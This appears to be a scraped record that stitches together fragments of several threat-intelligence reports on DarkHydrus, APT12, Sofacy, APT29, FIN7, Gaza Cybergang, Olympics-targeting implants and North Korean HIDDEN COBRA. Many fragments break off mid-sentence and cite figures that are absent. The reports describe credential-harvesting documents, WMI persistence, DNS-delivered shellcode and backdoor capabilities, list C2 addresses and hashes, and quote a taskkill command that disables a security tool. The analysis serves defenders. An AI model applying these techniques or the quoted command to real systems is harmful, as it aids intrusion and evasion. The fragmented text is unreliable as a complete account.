DarkHydrus document from June 2018 We were able to replicate the remote template path seen in Figure 4 by using Phishery to create a weaponized delivery document Figure 5 Phishery command used to create a document that has same remote template URL as DarkHydrus To confirm, we used Phishery\u2019s C2 server and opened DarkHydrus\u2019 Word document from the June 2018 attacks When presented with the authentication dialog box, we entered \u201cfakename\u201d and \u201cfakepass\u201d as credentials, as seen in Figure 6 and pressed enter The C2 server was able to obtain the \u201cfakename\u201d and \u201cfakepass\u201d credentials entered into the authentication dialog box displayed when opening DarkHydrus\u2019 Word document Figure 7 Output of Phishery C2 showing captured credentials Conclusion DarkHydrus is a threat group carrying out attack campaigns targeting organizations in the Middle East We discovered DarkHydrus carrying out credential harvesting attacks that use weaponized Word documents, which they delivered via spear-phishing emails to entities within government and educational institutions This threat group not only used the Phishery tool to create these malicious Word documents, but also to host the C2 server to harvest credentials The use of Phishery further shows Dark Hydrus\u2019 reliance on open source tools to conduct their operations Palo Alto Networks

IXESHE, DynCalc, and DNSCALC) recently started a new campaign targeting organizations in Japan and Taiwan APT12 is believed to be a cyber espionage group thought to have links to the Chinese People's Liberation Army APT12's targets are consistent with larger People's Republic of China (PRC) goals Additionally, the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure, as APT12 used the same strategy after compromising the New York Times in Oct 2012 Much like Darwin\u2019s theory of biological evolution, APT12 been forced to evolve and adapt in order to maintain its mission The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog \u201cIlluminating The Etumbot APT Backdoor.\u201d FireEye refers to the Etumbot backdoor as RIPTIDE Since the release of the Arbor blog post, FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE This is the second time FireEye has discovered APT12 retooling after a public disclosure As such, FireEye believes this to be a common theme for this APT group, as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations FireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT Both backdoors were dropped from malicious documents built utilizing the \u201cTran Duy Linh\u201d exploit kit, which exploited CVE-2012-0158 These documents were also emailed to organizations in Japan and Taiwan While APT12 has previously used THREEBYTE, it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE Similarly, WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified However, the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12 Figure 1: RIPTIDE HTTP GET Request Example In June 2014, Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014 Following the release of the article, FireEye observed a distinct change in RIPTIDE\u2019s protocols and strings We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules FireEye dubbed this new malware family HIGHTIDE HIGHTIDE Malware Family On Sunday August 24, 2014 we observed a spear phish email sent to a Taiwanese government ministry It is worth noting that this email appeared to have been sent from another Taiwanese Government employee, implying that the email was sent from a valid but compromised account Figure 2: \u00a0APT12 Spearphishing Email The exploit document dropped the HIGHTIDE backdoor with the following properties:   MD5 6e59861931fa2796ee107dc27bfdd480 Size 75264 bytes Complie Time 2014-08-23 08:22:49 Import Hash ead55ef2b18a80c00786c25211981570   The HIGHTIDE backdoor connected directly to 141.108.2.157 FireEye observed APT12 deliver these exploit documents via phishing emails in multiple cases Based on past APT12 activity, we expect the threat group to continue to utilize phishing as a malware delivery method RIPTIDE and HIGHTIDE differ on several points: executable file location, image base address, the User-Agent within the GET requests, and the format of the URI All but one sample that we identified were written to this folder as word.exe The one outlier was written as winword.exe Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28 THREEBYTE Malware Family On Monday August 25, 2014 we observed a different spear phish email sent from lilywang823@gmail.com to a technology company located in Taiwan This spear phish contained a malicious Word document that exploited CVE-2012-0158 The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11 Similar to the newly discovered HIGHTIDE samples documented above, this malicious document dropped a backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL

499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe The backdoor had the following properties:   MD5

icc[.]ignorelist[.]com The same \u201cTran Duy Linh\u201d Microsoft Word Exploit Kit was used in delivery of this backdoor Similar Targets were observed where the threat actors utilized this backdoor APT12 has the ability to adapt quickly to public exposures with new tools, tactics, and procedures (TTPs) Public disclosures may result in an immediate change in APT12\u2019s tools These changes may be temporary and FireEye believes they are aimed at decreasing detection of their tools until a more permanent and effective TTP change can be implemented (e.g., WATERSPOUT) Although these points do not definitively tie WATERSPOUT to APT12, they do indicate a possible connection between the WATERSPOUT campaign, the THREEBYTE campaign, and the HIGHTIDE campaign attributed to APT12 Conclusion FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset These development efforts may have resulted in the emergence of the WATERSPOUT backdoor Figure 7: Compile dates for all three malware families\u00a0 APT12\u2019s adaptations to public disclosures lead FireEye to make several conclusions about this threat group: Though public disclosures resulted in APT12 adaptations, FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels Similarly, the public disclosure of APT12\u2019s intrusion at the New York Times also led to only a brief pause in the threat group\u2019s activity and immediate changes in TTPs The pause and retooling by APT12 was covered in the Mandiant 2014 M-Trends report Currently, APT12 continues to target organizations and conduct cyber operations using its new tools Most recently, FireEye observed HIGHTIDE at multiple Taiwan-based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan-based electronics company We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders Note: IOCs for this campaign can be found here ", "Bryan Lee", "April 17, 2019", "Dear Joohn: The Sofacy Group\u2019s Global Campaign", "Retrieved May

the Sofacy group (AKA Fancy Bear, APT28, STRONTIUM, Pawn Storm, Sednit) has persistently attacked various government and private organizations around the world from mid-October 2018 through mid-November 2018 The majority of targets were NATO-aligned nation states, although several former USSR nation states were also targeted The attacks primarily deployed variants of the Zebrocy tool, which we have previously analyzed A smaller subset of the delivery documents\u00a0 delivered Cannon or a Zebrocy Delphi variant as reported by ESET Since we began tracking the use of Zebrocy going back to mid-2015, we have observed a significant increase in frequency of deployment of this tool Compared to other backdoor tools associated with the Sofacy group, the use of Zebrocy in attack campaigns is far more widespread The cluster of activity we detail in this blog revolves primarily around a common author name used in each of the delivery documents: Joohn Our initial sample of interest was the delivery document using the crash list(Lion Air Boeing 737).docx filename, which delivered the Zebrocy tool By leveraging our AutoFocus threat intelligence platform in conjunction with data collected from VirusTotal, we were able to pivot from artifacts discovered in the metadata and behaviors to discover the Cannon tool, as well as a number of additional delivery documents, payloads, and targets The attack vector for all of these attacks appears to be via spear-phishing, using email accounts registered to legitimate email providers instead of spoofed email addresses or previously compromised accounts The delivery documents were functionally all the similar, using the remote template function in Microsoft Word to retrieve a malicious macro from the first stage C2 and ultimately loading and executing an initial payload In all, we intercepted nine weaponized documents spanning from October 17, 2018 through November 15, 2018 all sharing the same Joohn author name and delivering variants of either Zebrocy or Cannon The target radius of our dataset spans four continents, covering government agencies at the federal level all the way to local government agencies We also conducted timeline analysis using the collected data which allowed us to discover how the Sofacy group timed their attacks in the Dear Joohn campaign and also how they may have crafted their attacks using automated tools Attack Details Beginning on October 17, 2018, we collected a total of nine delivery documents sent to a multitude of organizations around the world The targets included a foreign affairs organization in North America, foreign affairs organizations in Europe, as well as government entities in former USSR states We also discovered evidence of possible targeting of local law enforcement agencies around the world, covering North America, Australia, and Europe Our telemetry also showed possible targeting of NGOs, marketing firms, as well as organizations in the medical industry The attack vector of these attacks was all via spear-phishing, using email accounts registered to the free email provider Seznam, a popular web services provider located in the Czech Republic An example can be seen in Figure 1 Figure 1 Example spear-phishing email delivered in Dear Joohn attacks In this campaign, the Sofacy group appears to have relied heavily on filenames to lure victims into launching the weaponized documents Filenames ranged from topics alluding to Brexit, the Lion Air crash, and recent rocket attacks in Israel The full list of filenames we were able to collect can be seen in Table 1 Although the filenames appeared to be highly targeted and pertinent to the victims, the actual lure content of the documents were far more generic as seen in Figure 2 Figure 2 Generic lure image In November 2018, the adversary shifted tactics and began implementing non-generic lure content for their weaponized documents We collected three samples heavily targeting NATO-aligned nation states at this time, using three different lures as seen in Figure 3 Unpacking the document revealed that the unobfuscated image was a screenshot of a cover page regarding a NATO workshop in the targeted nation state The other two documents had very similar lures to each other, presenting garbled text to the target with instructions for the victim on how to properly view the document Interestingly, one of them contained instructions in Russian, which may indicate the intended target was a Russian speaking nation-state Each of these weaponized documents used the same

infrastructure did not provide significant\u00a0overlap or relationships with previous\u00a0Zebrocy\u00a0or\u00a0Sofacy\u00a0infrastructure.\u00a0A visual representation of the Dear Joohn campaign can be seen in Figure 6 Having three different C2 locations embedded inside these delivery documents while maintaining the exact same timestamping may indicate the use of an automated tool Using a command line based penetration testing toolkit such as Phishery could allow for simple scripting to generate multiple documents all at the same time with different inputs From there, there was an average of a two-week gap until these documents were first seen in the wild In total, these four documents had an average of roughly 46 days from initial creation to attack Based on the modular nature of the Dear Joohn campaign attacks, the lengthy amount of time from initial creation to attack may suggest the campaign was not yet ready for deployment due to additional development required for the remote templates, payloads, or infrastructure Another possible scenario is that the adversary may have had a certain timeframe they desired to execute the attack, and from the timeline it is clear there were two distinct targeting time frames, one from mid to late October 2018 and the other in mid-November 2018 As the campaign progressed, the operational tempo of the Dear Joohn campaign increased, with the total time from document creation to first seen dropping down to an average of roughly two days On average, there was a 13.8 hour gap between when the template document was last touched by the operator and when the delivery document is first observed in the wild This leads us to believe that the generation of the delivery documents were indeed part of a staging effort, first with the initial creation of the document, modification to it to communicate with a C2, then generating a remote template document just prior to launching the actual attack Analysis using timestamps is not always conclusive however With the notable exception of the Cannon tool, the first-stage tools are all variants of the Zebrocy Trojan The Zebrocy variants delivered in this campaign were written in

Cannon variant written in Delphi We have seen Sofacy using multiple languages to create variants of the Zebrocy Trojan, so it seems fitting that the group would create additional variants of Cannon in multiple programming languages as well C# Cannon Since our initial blog that introduced the Cannon tool, we were able to collect more samples of Cannon to get a better understanding of its origins It appears that the first known sample of Cannon was created on April 18, 2018 and since then there has been at least seven additional samples Table 5 shows the known Cannon samples, their compilation

Samples The compilation times in Table 6 suggests that the Delphi variant of Cannon predates the originally reported version, as the first known Delphi sample was compiled in January 2018 and the first known Cannon sample was compiled in April 2018 This actor controlled domain links to a larger Sofacy infrastructure as reported by ThreatConnect While not an exact match, Figure 9 shows these similar header strings and strengthens our hypothesis that the two variants are indeed related:  Figure 9 Similarities of Delphi Cannon and Cannon As seen in Table 6, one of the Delphi Cannon samples (SHA256: cac630c11c..) does not have any associated email addresses, as the sample does not seem to have any C2 functionality Instead, this sample reads \u201ctasks\u201d from a file named ta.bin that another unknown tool then must write to and handle C2 functionality It is also interesting that this specific sample has the same resource name (L30) that contains the same encrypted email addresses as the other samples in Table 6 using heatlth500@ambcomission[.]com as a C2 email (such as ecc5805898..) but does not contain any code to access the resource or decrypt its contents VB.NET Zebrocy Variant The VB.NET variant (SHA256: e5aece694d..) is very similar to other known Zebrocy variants It includes the storage volume serial number within the URL it uses as its C2 beacon, which it obtains using the Scripting.FileSystemObject object to call GetDriveName from the path stored in Environment.SpecialFolder.LocalApplicationData It then uses the storage volume obtained from the GetDriveName function and calls GetDrive to get the SerialNumber of the storage device Like other Zebrocy tools, the C# variant gathers the storage volume serial number to use in outbound beacons to the C2 server In this particular variant, the tool uses the Windows API function GetVolumeInformation to get the serial number of the C: drive This variant of Zebrocy also takes a screenshot that it will transmit to the C2 server in JPEG format We observed them carrying out attacks via spear-phishing emails in late October through November, often leveraging current events within filenames to entice recipients to open the malicious attachments The group continues to develop new variations of Zebrocy by adding a VB.NET and C# version, and it appears that they also have used different variants of the Cannon

"March 31, 2017", "Dissecting One of APT29\u2019s Fileless WMI and PowerShell Backdoors (POSHSPY)", "Retrieved May 07, 2019", "Article Content Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY In the investigations Mandiant has conducted, it appeared that APT29 deployed POSHSPY as a secondary backdoor for use if they lost access to their primary backdoors POSHSPY makes the most of using built-in Windows features \u2013 so-called \u201cliving off the land\u201d \u2013 to make an especially stealthy backdoor Every aspect of POSHSPY is efficient and covert Later in that same engagement, the attacker updated the deployment of the backdoor to use WMI for storage and persistence Mandiant has since identified POSHSPY in several other environments compromised by APT29 over the past two years We first discussed APT29\u2019s use of this backdoor as part of our \u201cNo Easy Breach\u201d talk For additional details on how we first identified this backdoor, and the epic investigation it was part of, see the slides and presentation WMI provides many administrative capabilities on local and remote systems, including querying system information, starting and stopping processes, and setting conditional triggers WMI classes can contain methods (code) and properties (data) Users with sufficient system-level privileges can define custom classes or extend the functionality of the many default classes Attackers often use this functionality to persist the execution of backdoors at system start up WMI Consumers specify an action to be performed, including executing a command, running a script, adding an entry to a log, or sending an email A FilterToConsumerBinding associates Consumers to Filters Creating a WMI permanent event subscription requires administrative privileges on a system We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code To store the code, APT29 created a new WMI class and added a text property to it in order to store a string value This allowed them to install a persistent backdoor without leaving any artifacts on the system\u2019s hard drive, outside of the WMI repository This \u201cfileless\u201d backdoor methodology made the identification of the backdoor much more difficult using standard host analysis techniques The WindowsParentalControlsMigration consumer was configured to silently execute a base64-encoded PowerShell command The PowerShell command contained the payload storage location and encryption keys Figure 2 displays the command, called the \u201cCommandLineTemplate\u201d, executed by the WindowsParentalControlsMigration consumer The backdoor contains several notable capabilities, including: 1 Downloading and executing PowerShell code as an EncodedCommand   2 Modifying the Standard Information timestamps (created, modified, accessed) of every downloaded executable to match a randomly selected file from the System32 directory that was created prior to 2013   4 Deriving C2 URLs from a Domain Generation Algorithm (DGA) using lists of domain names, subdomains, top-level domains (TLDs), Uniform Resource Identifiers (URIs), file names, and file extensions   6 Using either custom cookie names and values or randomly-generated cookie names and values for each network connection   8 Uploading data in 2048-byte chunks   9 Appending a file signature header to all encrypted data, prior to upload or download, by randomly selecting from the file types:  ICO GIF JPG PNG MP3 BMP    The sample in this example used 11 legitimate domains owned by an organization located near the victim When combined with the other options in the DGA, 550 unique C2 URLs could be generated Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended file headers used to bypass content inspection made this backdoor difficult to identify using typical network monitoring techniques Conclusion POSHSPY is an excellent example of the skill and craftiness of APT29 By \u201cliving off the land\u201d they were able to make an extremely discrete backdoor that they can deploy alongside their more conventional and noisier backdoor families, in order to help ensure persistence even after remediation As stealthy as POSHSPY can be, it comes to light quickly if you know where to look Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment This is one of several sneaky backdoor families that we have identified, including an off-the-shelf domain fronting backdoor and HAMMERTOSS When responding to an APT29 breach, it is vital to increase visibility, fully scope the incident before responding and thoroughly analyze accessed systems that don't contain known malware", "Security Response Attack Investigation Team", "April 03, 2019", "Dragonfly:

Restaurant Industry", "Retrieved May 07, 2019", "Article Content INTRODUCTION On June 7, 2017, Morphisec Lab identified a new, highly sophisticated fileless attack targeting restaurants across the US The ongoing campaign allows hackers to seize system control and install a backdoor to steal financial information at will It incorporates some never before seen evasive techniques that allow it to bypass most security solutions \u2013 signature and behavior based Aside from these updated techniques, Morphisec\u2019s investigation revealed an almost perfect match to FIN7 attack methods Past highly successful and damaging attacks on banks, SEC personnel, large restaurant chains and hospitality organizations have all been attributed to the financially-motivated FIN7 group FIN7, which is also associated with the Carbanak gang, must be seen as one of the leading threat actor groups operating today The Word document executes a fileless attack that uses DNS queries to deliver the next shellcode stage (Meterpreter) OpenDNS investigate data, shared in coordination with the Cisco Advanced Threat Research & Efficacy Team, shows that this is a large-scale, currently active attack with peaks of more than 10K DNS requests per hour This means the attackers successfully bypass static analysis by most of the security solutions By contrast, Morphisec\u2019s Moving Target Defense-based technology prevents the attack in its early stages, before any channel to the attacker is opened TECHNICAL ANALYSIS Below we describe the full technical details, beginning with the initial email through the final Meterpreter session used to hijack the computer PHISHING EMAIL: As seen in the email below, FIN7\u2019s attack campaign targets restaurants The content of the email is well crafted to avoid suspicion Some of the email attachments are called menu.rtf, others Olive Garden.rtf or Chick Fil A Order.rtf\u00a0(all the identified hashes are listed at the end) WORD DELIVERY: The attached .rtf file uses OLE and has many similarities to previous FIN7 attacks But this attack, instead of activating hta files (mshta.exe) from within the link, executes obfuscated JavaScript code All the victim needs to do is double click on the envelope and press OK PERSISTENCY: In some cases, an additional scheduled task \u201cAdobeFlashSync\u201d is created for persistency Afterwards, it deletes its own JavaScript code traces The shellcode is the primary differentiating technique between this campaign and past attacks by FIN7 and other threat actors This shellcode iterates over process environment block and looks immediately for dnsapi.dll name (xor 13) and its DnsQueryA function Basically, FIN7 implemented a shellcode that gets the next stage shellcode using the DNS messaging technique directly from memory This way they can successfully evade many of the behavior based solutions In the DNS query pattern, it is very clear to see that alphabetical modification of the subdomain prefix is used:  Each such DNS query results in an additional snippet of shellcode being appended to a reallocated buffer (It takes a few minutes for the DNS queries to finish This prefix indicates it may be a dll, and its deletion helps the attack to evade memory scanning solutions Just before this step executed, we extracted the dll from memory and uploaded it to VirusTotal If this dll was saved on disk, many security solutions would immediately identify it as a CobaltStrike Meterpreter, which is used by many attackers and pen testers CONCLUSIONS: FIN7 constantly upgrades their attacks and evasion techniques, thus becoming even more dangerous and unpredictable The analysis of this attack shows, how easy it is for them to bypass static, dynamic and behavior based solutions These attacks pose a severe risk to enterprises Fileless attacks are on the rise \u2013 Carbon Black reports that researchers found a 33% rise in severe non-malware attacks in Q4 2016 compared to Q1 Defenders will see more attacks on their businesses by hacker groups utilizing memory for evasion while keeping executable artifacts far away from disk In this continuously evolving threat landscape, enterprises need to look for new defenses that are resilient to such changes and are able to prevent fileless attacks Morphisec Endpoint Threat Prevention specializes in preventing in-memory attacks, using Moving Target Defense to make the target itself unpredictable", "Security Response Attack Investigation Team", "October 10, 2018", "Gallmaker: New Attack Group Eschews Malware

politically motivated Arabic-language cyberthreat actor, actively targeting the MENA (Middle East North Africa) region, especially the Palestinian Territories The confusion surrounding Gaza Cybergang\u2019s activities, separation of roles and campaigns has been prevalent in the cyber community For a while, the gang\u2019s activities seemed scattered, involving different tools and methods, and different malware and infection stages, although there was an alignment in its goals\u2026 During our 2018 monitoring of this group, we were able to identify different techniques utilized by very similar attackers in the MENA region, sometimes on the same target The findings led to us distinguishing between three attack groups operating within Gaza Cybergang:  Gaza Cybergang Group1 (classical low-budget group), also known as MoleRATs; Gaza Cybergang Group2 (medium-level sophistication) with links to previously known Desert Falcons; Gaza Cybergang Group3 (highest sophistication) whose activities previously went by the name Operation Parliament The groups use different styles and, in some cases, techniques, but deploy common tools and commands after initial infection The three attack groups were identified sharing victims For example, Group1 would deploy a script to infect a specific victim with malware belonging to Group2, or similarly between Group2 and Group3 More information on previous Desert Falcons (Group2) and Operation Parliament (Group3) activities can be found below:  Group2: \u2018The Desert Falcons targeted attacks\u2018 Group3: \u2018Operation Parliament, who is doing what?\u2018  Additional findings on Gaza Cybergang Group2 and Group3 will be presented in future publications For more information, please contact: intelreports@kaspersky.com Summary Gaza Cybergang Group1, described in this post, is the least sophisticated of the three attack groups and relies heavily on the use of paste sites (with the operation name SneakyPastes) in order to gradually sneak a remote access Trojan (RAT) or multiple, onto victim systems The group has been seen employing phishing, with several chained stages to evade detection and extend command and control server lifetimes The most popular targets of SneakyPastes are embassies, government entities, education, media outlets, journalists, activists, political parties or personnel, healthcare and banking In this post, we\u2019ll take a closer look at Gaza Cybergang Group1, including:  Updated 2018/2019 tactics, techniques and procedures Victimology of the group between Jan 2018 and Jan 2019 Historical checkpoints and politicized graphical decoys in Appendix I Full list of indicators of compromise in Appendix II  Technical analysis Through our continuous monitoring of threats during 2018, we observed a new wave of attacks by Gaza Cybergang Group1 targeting embassies and political personnel Gaza Cybergang Group1 is an attack group with limited infrastructure and an open-source type of toolset, which conducts widespread attacks, but is nevertheless focused on Palestinian political problems The attackers rely a lot on chained attack stages to evade quick detection and hide the communication infrastructure After an analysis of the samples, and through collaboration efforts with law enforcement agencies, we were able to uncover the full cycle of the intrusions that spread across the majority of the cyber kill chain, including but not limited to the toolset used, TTPs, infrastructure, action on objectives and the victimology These efforts have led to the takedown of a large portion of the related infrastructure In this campaign, Gaza Cybergang used disposable emails and domains as the phishing platform to target the victims We have identified several implants that leveraged PowerShell, VBS, JS, and dotnet for resilience and persistence The final stage, however, is a dotnet application that takes several commands such as directory listing, screenshot, compress, upload, etc It then creates random long string folder names in temp directories to host the collected files per category before compressing, encrypting and uploading to the C2 server Spreading The threat actor seemed able to spread attacks widely, but only deployed additional tools and data collection functions in specific cases, as though they had a target list or a filter for targeted victims These were necessary to lure the intended type of victims \u2013 people involved in politics Intrusion life-cycle analysis The diagram below displays at a high level the steps taken by typical Gaza Cybergang Group1 lure samples While different samples may use different methods to infect (i.e invoke PowerShell, VBS, .NET app downloader, etc.), they generally stick to the same scenario of a persistent RAT that steals data and uploads it to the C2 server despite the different hard-coded domains The analyzed samples had a lot of similarities in terms of the code used and especially in the

Infrastructure In 2018, the threat actor mostly relied on a single C2 server (192.169.7.250) and rotated a multitude of domain names over a period of time The phishing email infrastructure though relied on disposable email providers such as bit-degree.com, mail4gmail.com, careless-whisper.com and others Victimology Based on the analyzed metrics, the victims were spread across 39 countries and reached 240+ unique victims The Palestinian Territories host the majority of the victims, followed by Jordan, Israel, then Lebanon, as noted in the below table The most targeted entities are embassies, government entities, education, media outlets, journalists, activists, political parties or personnel, healthcare and banking Country Number of victims   Palestinian Territories 110   Jordan 25   Israel 17   Lebanon 11   Saudi Arabia 9   Syria 9   Egypt 7   UAE 6   Senegal, France, Germany, Iran, Malaysia, Belgium, Bosnia and Herzegovina, Libya, Morocco, Spain, Sri Lanka, Tunisia,

described in this post looks like a low sophistication group, with limited infrastructure and attack files that can be found in the wild, they are the most relentless in their attacks, with continuous targeting and high malleability This has allowed the group to achieve reasonable success against a relatively wide array of victims Gaza Cybergang is evolving and adapting to the MENA region \u2013 a complex setting with complex requirements The attacks are now divided into three groups with different levels of sophistication and different levels of targeting We expect the damage caused by these groups to intensify and the attacks to extend into other regions that are also linked to the complicated Palestinian situation The attackers also seem to be within reach of more advanced tools, techniques and procedures, and we expect them to rely more on these in future attacks More information on Desert Falcons (Group2) and Operation Parliament (Group3) will be presented in future

UPDATE (Feb 12, 2018):\u00a0A new variant of the original file-less implant appeared on Feb 5, 2018, indicating the attack has resumed The new variant has the same author and metadata as the original documents discovered in December, as well as a nearly identical implant A key difference, however, is the attackers leveraged hacked servers is Santiago, Chile See indicators of compromise for this update at the bottom of this post ORIGINAL POST (Feb 2, 2018):\u00a0McAfee Advanced Threat Research (ATR) recently released a report describing a fileless attack targeting organizations involved with the Pyeongchang Olympics The attack used a PowerShell implant that established a channel to the attacker\u2019s server to gather basic system-level data What was not determined at that time was what occurred after the attacker gained access to the victim\u2019s system We have named these implants, which appeared in December 2017, Gold Dragon, Brave Prince, Ghost419, and Running Rat, based on phrases in their code On December 24, 2017, our analysts observed the Korean-language implant Gold Dragon We now believe this implant is the second-stage payload in the Olympics attack that ATR discovered January 6, 2018 However, this implant required additional modules to be executed to be a fully capable backdoor Gold Dragon has a much more robust persistence mechanism than the initial PowerShell implant and enables the attacker to do much more to the target system Gold Dragon reappeared the same day that the Olympics campaign began The Gold Dragon malware appears to have expanded capabilities for profiling a target\u2019s system and sending the results to a control server The PowerShell implant had only basic data-gathering capabilities\u2014such as username, domain, machine name, and network configuration\u2014which are useful only for identifying interesting victims and launching more complex malware against them Gold Dragon Gold Dragon is a data-gathering implant observed in the wild since December 24 Gold Dragon gets its name from the hardcoded domain www.golddragon.com, which we found throughout the samples This sample acts as a reconnaissance tool and downloader for subsequent payloads of the malware infection and payload chain Apart from downloading and executing binaries from the control server, Gold Dragon generates a key to encrypt data that the implant obtains from the system This URL is not used for control; the encrypted data is sent to the server ink.inkboom.co.kr, which was used by previous implants as early as May 2017 Gold Dragon contains elements, code, and similar behavior to implants Ghost419 and Brave Prince, which we have tracked since May 2017 A DLL-based implant created on December 21 (the same day the first malicious Olympics document appeared) was downloaded by a Gold Dragon variant created December 24 This variant was created three days before the targeted spear phishing email with the second document that was sent to 333 victim organizations The December 24 variant of Gold Dragon used the control server nid-help-pchange.atwebpages.com, which was also used by a Brave Prince variant from December 21 The first variants of Gold Dragon appeared in the wild in South Korea in July 2017 The original Gold Dragon had the file name \ud55c\uae00\ucd94\ucd9c.exe, which translates as Hangul Extraction and was seen exclusively in South Korea Five variants of Gold Dragon compiled December 24 appeared heavily during the targeting of the Olympics organizations (HWP is a Korean word processor similar to Microsoft Word.)   Checking for HWP.exe in the process list If found, these processes are terminated by sending a WM_CLOSE message to their windowing threads Terminating an antimalware/cleaner process Brave Prince Brave Prince is a Korean-language implant that contains similar code and behavior to the Gold Dragon variants, specifically the system profiling and control server communication mechanism The malware gathers detailed logs about the victim\u2019s configuration, contents of the hard drive, registry, scheduled tasks, running processes, and more Brave Prince was first observed in the wild December 13, 2017, sending logs to the attacker via South Korea\u2019s Daum email service Later variants posted the data to a web server via an HTTP post command, in the same way that Gold Dragon does The embedded domain braveprince.com The Daum variants of Brave Prince gather information from the system and save it to the file PI_00.dat This file is sent as an attachment to the attacker\u2019s email address The type of data this implant gathers from the victim\u2019s system:  Directories and files Network configuration Address resolution protocol cache Systemconfig to gather tasks  Both variants of Brave Prince can kill a process associated with a tool created by Daum that can block malicious code This tool is exclusive to South Korea taskkill /f /im daumcleaner.exe  The later variants of Brave Prince include the following hardcoded strings:  c:\\utils\\c2ae_uiproxy.exe c:\\users\\sales\\appdata\\local\\temp\\dwrrypm.dl  \u00a0 Ghost419 Ghost419 is a Korean-language implant that first appeared in the wild December 18, 2017, with the most recent sample appearing two days before the Olympics spear phishing email The malware can be identified by the hardcoded string and URL parameter passed to the control server Ghost419 can be traced to a sample created July 29, 2017, that appears to be a much earlier version (without the hardcoded identifier) The July version shares 46% of its code with samples created in late December This early version implant creates a unique mutex value (kjie23948_34238958_KJ238742) that also appears in a sample from December, with the exception that one digit has changed Ghost419 is based on Gold Dragon and Brave Prince implants and contains shared elements and code, especially for system reconnaissance functions Hardcoded \u201cGhost419\u201d in the malware binary The string \u201cWebKitFormBoundarywhpFxMBe19cSjFnG,\u201d part of the upload mechanism, also appears in the Gold Dragon variants of late December 2017 Gold Dragon sample Ghost419 sample Numerous other similarities are present in addition to system reconnaissance methods; the communication mechanism uses the same user agent string as Gold Dragon Gold Dragon user agent string Ghost419 user agent string RunningRat RunningRat is a remote access Trojan (RAT) that operates with two DLLs It gets its name from a hardcoded string embedded in the malware Upon being dropped onto a system, the first DLL executes The batch file then attempts to remove itself The first DLL unpacks a resource file attached to the DLL using a zlib decompression algorithm The authors of the malware left the debugging strings in the binary, making the algorithm easy to identify The second DLL is decompressed in memory and never touches the user\u2019s file system; this file is the main RAT that executes This address is hardcoded in the second DLL as 200.200.200.13 and is modified by the first DLL to 223.194.70.136 This type of behavior may indicate this code is being reused or is part of a malware kit The first DLL uses one common antidebugging technique by checking for SeDebugPrivilege However, our current analysis shows no way for such code to be executed McAfee ATR analysts will continue to research RunningRat to determine if this extra code is used or is possibly left over from a larger RAT toolkit The second DLL employs a few additional antidebugging techniques One is the use of a custom exception handler and code paths that are designed to generate exceptions There are also a few random empty-nested threads to slow down researchers during static analysis Conclusion The PowerShell script first discovered by McAfee ATR was delivered via a spear phishing campaign that used image stenography techniques to hide the first-stage implant The implants are delivered as a second stage once the attacker gains an initial foothold using fileless malware Some of the implants will maintain their persistence only if Hangul Word, which is specific to South Korea, is running With the discovery of these implants, we now have a better understanding of the scope of this operation Gold Dragon, Brave Prince, Ghost419, and RunningRat demonstrate a much wider campaign than previously known The persistent data exfiltration we see from these implants could give the attacker a potential advantage during the Olympics We thank Charles Crawford and Asheer Malhotra for their

joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) This alert provides technical details on the tools and infrastructure used by cyber actors of the North Korean government to target the media, aerospace, financial, and critical infrastructure sectors in the United States and globally Working with U.S Government partners, DHS and FBI identified Internet Protocol (IP) addresses associated with a malware variant, known as DeltaCharlie, used to manage North Korea\u2019s distributed denial-of-service (DDoS) botnet infrastructure This alert contains indicators of compromise (IOCs), malware descriptions, network signatures, and host-based rules to help network defenders detect activity conducted by the North Korean government The U.S Government refers to the malicious cyber activity by the North Korean government as HIDDEN COBRA This alert identifies IP addresses linked to systems infected with DeltaCharlie malware and provides descriptions of the malware and associated malware signatures Government.For a downloadable copy of IOCs, see:IOCs (.csv)IOCs (.stix)On August 23, 2017, DHS published a Malware Analysis Report (MAR-10132963) that examines malware functionality to provide detailed code analysis and insight into specific tactics, techniques, and procedures (TTPs) observed in the malware.For a downloadable copy of the MAR, see:MAR (.pdf)MAR IOCs (.stix)  Description Since 2009, HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature Commercial reporting has referred to this activity as Lazarus Group[1] and Guardians of Peace.[2] DHS and FBI assess that HIDDEN COBRA actors will continue to use cyber operations to advance their government\u2019s military and strategic objectives Variants of malware and tools used by HIDDEN COBRA actors include Destover,[3] Wild Positron/Duuzer,[4] and Hangman.[5] DHS has previously released Alert TA14-353A,[6] which contains additional details on the use of a server message block (SMB) worm tool employed by these actors Further research is needed to understand the full breadth of this group\u2019s cyber capabilities In particular, DHS recommends that more research should be conducted on the North Korean cyber activity that has been reported by cybersecurity and threat research firms.HIDDEN COBRA actors commonly target systems running older, unsupported versions of Microsoft operating systems The 